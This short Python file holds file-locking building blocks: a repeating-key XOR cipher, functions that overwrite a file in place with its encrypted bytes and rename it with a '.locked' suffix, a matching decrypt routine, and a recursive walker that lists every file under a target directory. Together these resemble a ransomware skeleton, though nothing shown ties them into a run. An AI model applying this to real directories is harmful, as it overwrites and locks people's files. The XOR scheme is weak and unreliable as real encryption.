import os

def xor_crypt(data, password):
    return bytes([b ^ password[i % len(password)] for i, b in enumerate(data)])

def encrypt_file(file_path, password):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = xor_crypt(data, password.encode())
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        os.rename(file_path, file_path + '.locked')
        return True
    except:
        return False

def decrypt_file(file_path, password):
    try:
        if not file_path.endswith('.locked'):
            return False
        with open(file_path, 'rb') as f:
            data = f.read()
        decrypted = xor_crypt(data, password.encode())
        new_path = file_path.replace('.locked', '')
        with open(new_path, 'wb') as f:
            f.write(decrypted)
        os.remove(file_path)
        return True
    except:
        return False

def get_all_files(target_dir):
    all_files = []
    for root, _, files in os.walk(target_dir):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files
